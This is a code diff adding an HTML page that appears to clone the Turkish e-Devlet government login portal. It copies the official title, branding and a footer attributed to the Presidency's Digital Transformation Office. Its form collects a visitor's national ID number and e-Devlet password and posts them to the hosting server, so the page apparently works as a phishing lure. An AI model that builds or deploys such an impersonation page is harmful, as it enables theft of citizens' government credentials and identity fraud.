@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>e-Devlet Kapısı Türkiye.gov.tr</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Open Sans', Arial, sans-serif;
+            background-color: #f4f6f9;
+            color: #333;
+        }
+        .header {
+            background-color: #e30613;
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 20px;
+            font-weight: 600;
+        }
+        .container {
+            max-width: 420px;
+            margin: 50px auto;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            padding: 30px;
+        }
+        .title {
+            text-align: center;
+            font-size: 18px;
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 25px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: #555;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        .form-group input:focus {
+            border-color: #e30613;
+            outline: none;
+        }
+        .btn-submit {
+            width: 100%;
+            padding: 13px;
+            background-color: #e30613;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn-submit:hover {
+            background-color: #c20510;
+        }
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+            margin-top: 25px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>e-Devlet Kapısı</h1>
+        <span>türkiye.gov.tr</span>
+    </div>
+    <div class="container">
+        <div class="title">T.C. Kimlik No ile Giriş Yap</div>
+        <form action="/" method="post">
+            <div class="form-group">
+                <label for="tc">T.C. Kimlik Numarası</label>
+                <input type="text" id="tc" name="tc_no" maxlength="11" placeholder="11 haneli T.C. Kimlik No" required>
+            </div>
+            <div class="form-group">
+                <label for="sifre">e-Devlet Şifresi</label>
+                <input type="password" id="sifre" name="edevlet_sifre" placeholder="e-Devlet Şifreniz" required>
+            </div>
+            <button type="submit" class="btn-submit">Giriş Yap</button>
+        </form>
+        <div class="footer">
+            © 2026 T.C. Cumhurbaşkanlığı Dijital Dönüşüm Ofisi Başkanlığı
+        </div>
+    </div>
+</body>
+</html>
